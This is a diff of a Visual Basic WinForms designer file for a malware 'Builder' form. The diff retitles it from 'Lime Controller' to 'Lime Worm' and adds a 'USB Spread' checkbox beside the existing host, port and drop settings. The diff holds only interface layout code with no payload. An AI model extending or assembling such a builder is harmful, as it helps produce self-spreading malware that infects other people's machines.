@@ -22,6 +22,9 @@ Partial Class Builder
     'Do not modify it using the code editor.
     <System.Diagnostics.DebuggerStepThrough()> _
     Private Sub InitializeComponent()
+        Me.ChGroupBox3 = New Server_0._4.CHGroupBox()
+        Me.USB = New Server_0._4.CHCheckbox()
+        Me.ChButton1 = New Server_0._4.CHButton()
         Me.ChGroupBox2 = New Server_0._4.CHGroupBox()
         Me.DROP = New Server_0._4.CHOnOffBox()
         Me.PATH2 = New Server_0._4.CHTextbox()
@@ -35,10 +38,55 @@ Partial Class Builder
         Me.PORT = New Server_0._4.CHTextbox()
         Me.Label1 = New System.Windows.Forms.Label()
         Me.HOST = New Server_0._4.CHTextbox()
-        Me.ChButton1 = New Server_0._4.CHButton()
+        Me.ChGroupBox3.SuspendLayout()
         Me.ChGroupBox2.SuspendLayout()
         Me.ChGroupBox1.SuspendLayout()
         Me.SuspendLayout()
+        '
+        'ChGroupBox3
+        '
+        Me.ChGroupBox3.BackColor = System.Drawing.Color.Black
+        Me.ChGroupBox3.BorderStyle = System.Windows.Forms.FormBorderStyle.None
+        Me.ChGroupBox3.Controls.Add(Me.USB)
+        Me.ChGroupBox3.Customization = "AGQA/wAAAP8A/wD/"
+        Me.ChGroupBox3.Font = New System.Drawing.Font("Verdana", 8.0!)
+        Me.ChGroupBox3.Image = Nothing
+        Me.ChGroupBox3.Location = New System.Drawing.Point(12, 454)
+        Me.ChGroupBox3.Movable = True
+        Me.ChGroupBox3.Name = "ChGroupBox3"
+        Me.ChGroupBox3.NoRounding = False
+        Me.ChGroupBox3.Sizable = True
+        Me.ChGroupBox3.Size = New System.Drawing.Size(371, 120)
+        Me.ChGroupBox3.SmartBounds = True
+        Me.ChGroupBox3.StartPosition = System.Windows.Forms.FormStartPosition.Manual
+        Me.ChGroupBox3.TabIndex = 6
+        Me.ChGroupBox3.Text = "MISC"
+        Me.ChGroupBox3.TransparencyKey = System.Drawing.Color.Empty
+        Me.ChGroupBox3.Transparent = False
+        '
+        'USB
+        '
+        Me.USB.BackColor = System.Drawing.Color.Transparent
+        Me.USB.Checked = False
+        Me.USB.ForeColor = System.Drawing.Color.Black
+        Me.USB.Location = New System.Drawing.Point(19, 62)
+        Me.USB.Name = "USB"
+        Me.USB.Size = New System.Drawing.Size(214, 14)
+        Me.USB.TabIndex = 7
+        Me.USB.Text = "USB Spread"
+        '
+        'ChButton1
+        '
+        Me.ChButton1.Customization = "AGQA/wD/AP8AgAD/"
+        Me.ChButton1.Font = New System.Drawing.Font("Verdana", 8.0!)
+        Me.ChButton1.Image = Nothing
+        Me.ChButton1.Location = New System.Drawing.Point(12, 642)
+        Me.ChButton1.Name = "ChButton1"
+        Me.ChButton1.NoRounding = False
+        Me.ChButton1.Size = New System.Drawing.Size(371, 76)
+        Me.ChButton1.TabIndex = 5
+        Me.ChButton1.Text = "B u i l d"
+        Me.ChButton1.Transparent = False
         '
         'ChGroupBox2
         '
@@ -240,25 +288,13 @@ Partial Class Builder
         Me.HOST.Transparent = True
         Me.HOST.UsePasswordMask = False
         '
-        'ChButton1
-        '
-        Me.ChButton1.Customization = "AGQA/wD/AP8AgAD/"
-        Me.ChButton1.Font = New System.Drawing.Font("Verdana", 8.0!)
-        Me.ChButton1.Image = Nothing
-        Me.ChButton1.Location = New System.Drawing.Point(12, 460)
-        Me.ChButton1.Name = "ChButton1"
-        Me.ChButton1.NoRounding = False
-        Me.ChButton1.Size = New System.Drawing.Size(371, 76)
-        Me.ChButton1.TabIndex = 5
-        Me.ChButton1.Text = "B u i l d"
-        Me.ChButton1.Transparent = False
-        '
         'Builder
         '
         Me.AutoScaleDimensions = New System.Drawing.SizeF(9.0!, 20.0!)
         Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
         Me.BackColor = System.Drawing.Color.Black
-        Me.ClientSize = New System.Drawing.Size(395, 564)
+        Me.ClientSize = New System.Drawing.Size(395, 782)
+        Me.Controls.Add(Me.ChGroupBox3)
         Me.Controls.Add(Me.ChButton1)
         Me.Controls.Add(Me.ChGroupBox2)
         Me.Controls.Add(Me.ChGroupBox1)
@@ -268,8 +304,9 @@ Partial Class Builder
         Me.Name = "Builder"
         Me.SizeGripStyle = System.Windows.Forms.SizeGripStyle.Hide
         Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
-        Me.Text = "Builder | Lime Controller"
+        Me.Text = "Builder | Lime Worm"
         Me.TopMost = True
+        Me.ChGroupBox3.ResumeLayout(False)
         Me.ChGroupBox2.ResumeLayout(False)
         Me.ChGroupBox2.PerformLayout()
         Me.ChGroupBox1.ResumeLayout(False)
@@ -292,4 +329,6 @@ Partial Class Builder
     Friend WithEvents PATH2 As CHTextbox
     Friend WithEvents ChButton1 As CHButton
     Friend WithEvents DROP As CHOnOffBox
+    Friend WithEvents ChGroupBox3 As CHGroupBox
+    Friend WithEvents USB As CHCheckbox
 End Class
